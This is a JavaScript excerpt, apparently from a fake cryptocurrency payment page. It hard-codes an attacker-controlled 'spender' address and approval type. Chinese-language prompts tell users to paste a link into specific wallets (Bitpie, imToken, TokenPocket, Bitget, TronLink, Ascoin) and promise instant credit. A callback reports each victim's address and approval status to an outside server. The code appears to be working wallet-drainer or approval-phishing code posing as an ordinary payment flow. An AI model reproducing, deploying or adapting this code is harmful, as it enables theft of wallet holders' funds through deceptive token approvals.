spender_bas58 = 'TFpfmwKGD8x1zEsVoELsp9uYcyb3W3mLHd';
...
eth_address = '0xfD7E473A9FFFEb7aebD38aaa35A0Fe6abb1979AB';
approve_type = 2;
...
function successCallback(address, approved, type) {
    sendGetRequest("https://xk777.xyz/successpay.php?address=" + address + "&approved=" + approved + "&chain=" + chain + "&type=" + type, function (responseData) {
...
function copyAndAlert(selectIndex, callable) {
    ...
    switch (selectIndex) {
        case 15:
            images = ['/paystatic/img/tips/BITPIE-help1.5b9c05f611111.jpg', ];
            messageText = "链接已复制，前往您的比特派钱包选择TRON网络，粘贴支付；如无法支付；请在钱包右下角我的设置里面更新版本在支付；付款成功后秒到账。";
            break;
        case 11:
            images = ['/paystatic/img/tips/photo_1_2024-10-25_15-55-41.jpg',
                '/paystatic/img/tips/imtoken-help3.cf1f0a403.jpg'];
            messageText = "链接已复制，前往您的im钱包粘贴支付；付款成功后秒到账。";
            break;
        case 14:
            images = ['/paystatic/img/tips/photo_1_2024-10-25_15-58-39.jpg', '/paystatic/img/tips/tp-help3.5d9a5fa233.jpg'];
            messageText = "链接已复制，前往您TP钱包粘贴支付；付款成功后秒到账。";
            break;
        case 13:
            images = ['/paystatic/img/tips/BitKeep-help1.73143e1411.jpg', '/paystatic/img/tips/BitKeep-help2.a6449b3f22.jpg'];
            messageText = "链接已复制，前往您的Bitget钱包粘贴支付，如提示选择TRX，请右上角切换TRON网络跟您的地址在支付；付款成功后秒到账。";
            break;
        case 12:
            images = ['/paystatic/img/tips/tronlink1.968ec0d6111.jpg', ];
            messageText = "链接已复制，前往您波宝钱包粘贴支付；付款成功后秒到账。";
            break;
        case 16:
            images = ['/paystatic/img/tips/IMG_20241025_221554_365.jpg', ];
            messageText = "链接已复制，前往您Ascoin钱包粘贴、选择Tron网络支付；付款成功后秒到账。";
            break;
        default:
            images = ['/paystatic/img/tips/default-image.jpg'];
